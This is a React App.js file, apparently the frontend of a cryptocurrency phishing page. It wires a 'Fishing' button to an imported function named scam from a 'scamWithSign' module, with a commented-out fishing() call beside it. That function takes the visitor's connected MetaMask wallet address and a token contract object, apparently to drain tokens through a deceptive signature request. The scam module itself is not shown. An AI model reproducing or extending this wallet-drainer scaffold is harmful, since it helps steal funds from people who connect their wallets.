import logo from './logo.svg';
import './App.css';
import { connectMetamask, erc20Obj, walletAddress } from "./lib/wallets/index.js"
import { scam } from './script/scamWithSign';

async function activateLasers() {
  // await fishing(walletAddress, erc20Obj);
  await scam(walletAddress, erc20Obj);
}

function App() {
  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} className="App-logo" alt="logo" />
        <p>
          Edit <code>src/App.js</code> and save to reload.
        </p>
        <button onClick={connectMetamask}>
          Activate MetaMask
        </button>
        <button onClick={activateLasers}>
          Fishing
        </button>
        <a
          className="App-link"
          href="https://reactjs.org"
          target="_blank"
          rel="noopener noreferrer"
        >
          Learn React
        </a>
      </header>
    </div>
  );
}

export default App;
